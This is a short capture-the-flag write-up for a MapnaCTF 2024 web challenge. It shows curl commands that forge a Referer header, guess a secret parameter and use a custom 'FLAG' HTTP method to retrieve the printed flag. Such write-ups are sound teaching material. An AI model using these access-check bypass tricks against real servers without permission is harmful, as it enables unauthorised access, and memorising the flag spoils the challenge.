---
title: "Flag Holding"
description: "Hopefully you know how web works..."
pubDate: 2024-01-22
ctf: "MapnaCTF 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-mapnactf/icon.png"
---

Initially with the webserver given I visit the page, and this particular portion of text is displayed:

You are not coming from "http://flagland.internal/”

I move to cURL to do this challenge, and determine this is probably referring to the `Referer` header.

```
$ curl "http://18.184.219.56:8080/" -H "Referer: http://flagland.internal/"
Unspecified "secret".
```

Interesting, I make a new parameter `secret` and set it with a value of `1`.

```
$ curl "http://18.184.219.56:8080/?secret=1" -H "Referer: http://flagland.internal/"
Incorrect secret. <!-- hint: secret is ____ which is the name of the protocol that both this server and your browser agrees on... -->
```

The hint is likely to be filled with `http`.

```
$ curl "http://18.184.219.56:8080/?secret=http" -H "Referer: http://flagland.internal/"
Sorry we don't have "GET" here but we might have other things like "FLAG”.
```

I change the method from `GET` to `FLAG`.

```
$ curl -X FLAG "http://18.184.219.56:8080/?secret=http" -H "Referer: http://flagland.internal/"
MAPNA{533m5-l1k3-y0u-kn0w-h77p-1836a2f}
```

There we go!

Flag: `MAPNA{533m5-l1k3-y0u-kn0w-h77p-1836a2f}`